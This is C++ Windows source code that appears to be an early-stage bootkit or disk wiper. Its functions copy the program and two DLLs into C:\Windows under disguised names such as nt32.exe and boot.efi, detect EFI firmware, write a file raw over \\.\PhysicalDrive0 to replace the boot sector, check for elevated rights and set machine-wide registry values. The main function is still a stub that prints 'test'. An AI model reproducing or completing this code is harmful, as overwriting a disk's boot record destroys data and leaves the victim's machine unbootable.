#include <iostream>
#include <Windows.h>
#include <WinUser.h>
#include <direct.h>
#include <vector>
#include <winbase.h>

using namespace std;

wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
{
    wchar_t* wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
    return wString;
}

void UnpackDeps(LPCWSTR filename) {
    CopyFile(filename, L"C:\\Windows\\nt32.exe", false);
    CopyFile(L"appvcompat.dll", L"C:\\Windows\\boot.bin", false);
    CopyFile(L"appverifui.dll", L"C:\\Windows\\boot.efi", false);
}

DWORD is_efi() {
    char buffer[1024];
    DWORD envvar = GetFirmwareEnvironmentVariable(L"", L"{00000000 - 0000 - 0000 - 0000 - 000000000000}", buffer, sizeof(buffer));
    return envvar;
}

int BIOSBootFlash() {
    // Open the source file
    HANDLE hSource = CreateFile(TEXT("C:\\Windows\\boot.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSource == INVALID_HANDLE_VALUE) {
        return 1;
    }

    // Get the size of the source file
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hSource, &fileSize)) {
        CloseHandle(hSource);
        return 1;
    }

    // Read the source file into a buffer
    vector<BYTE> buffer(fileSize.QuadPart);
    DWORD bytesRead;
    if (!ReadFile(hSource, buffer.data(), buffer.size(), &bytesRead, NULL) || bytesRead != buffer.size()) {
        CloseHandle(hSource);
        return 1;
    }

    // We're done with the source file
    CloseHandle(hSource);

    // Open the target disk
    HANDLE hDevice = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        return 1;
    }

    // Write the buffer to the disk
    DWORD bytesWritten;
    if (!WriteFile(hDevice, buffer.data(), buffer.size(), &bytesWritten, NULL) || bytesWritten != buffer.size()) {
        CloseHandle(hDevice);
        return 1;
    }

    // We're done with the device
    CloseHandle(hDevice);

    return 0;
}

bool SetPermanentEnvironmentVariable(LPCTSTR value, LPCTSTR data) {
    HKEY hKey;
    LPCTSTR keyPath = TEXT("System\\CurrentControlSet\\Control\\Session Manager\\Environment");
    LSTATUS lOpenStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_ALL_ACCESS, &hKey);
    if (lOpenStatus == ERROR_SUCCESS) {
        LSTATUS lSetStatus = RegSetValueEx(hKey, value, 0, REG_SZ, (LPBYTE)data, lstrlen(data) + 1);
        RegCloseKey(hKey);
        if (lSetStatus == ERROR_SUCCESS) {
            SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)"Environment", SMTO_BLOCK, 100, NULL);
            return true;
        }
    }
    return false;
}

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

LONG SetRegValue(const wchar_t* path, const wchar_t* name, const wchar_t* value) {
    LONG status;
    HKEY hKey;
    status = RegOpenKeyEx(HKEY_CURRENT_USER, path, 0, KEY_ALL_ACCESS, &hKey);
    if (status == ERROR_SUCCESS && hKey != NULL) {
        status = RegSetValueEx(hKey, name, 0, REG_SZ, (BYTE*)value, ((DWORD)wcslen(value) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    return status;
}

int main(int argc, char** argv)
{
    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);

    cout << "test" << endl;
    return 0;
}
